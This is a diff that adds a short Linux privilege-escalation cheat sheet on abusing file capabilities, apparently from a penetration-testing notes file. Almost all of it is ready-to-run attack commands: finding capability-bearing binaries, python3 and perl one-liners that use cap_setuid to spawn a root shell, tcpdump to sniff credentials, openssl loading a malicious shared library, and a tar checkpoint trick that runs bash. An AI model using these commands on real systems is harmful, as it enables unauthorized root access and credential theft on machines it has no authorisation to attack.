@@ -1,0 +1,17 @@
+CAPABILITIES
+bash# Find capabilities
+getcap -r / 2>/dev/null
+
+# Common exploitable caps
+# cap_setuid
+python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+perl -e 'use POSIX (setuid);setuid(0);exec "/bin/bash"'
+
+# cap_net_raw (tcpdump → sniff creds)
+tcpdump -i eth0 -w /tmp/cap.pcap
+
+# openssl cap_setuid
+openssl req -engine /tmp/malicious.so   # load shared lib
+
+# tar cap
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
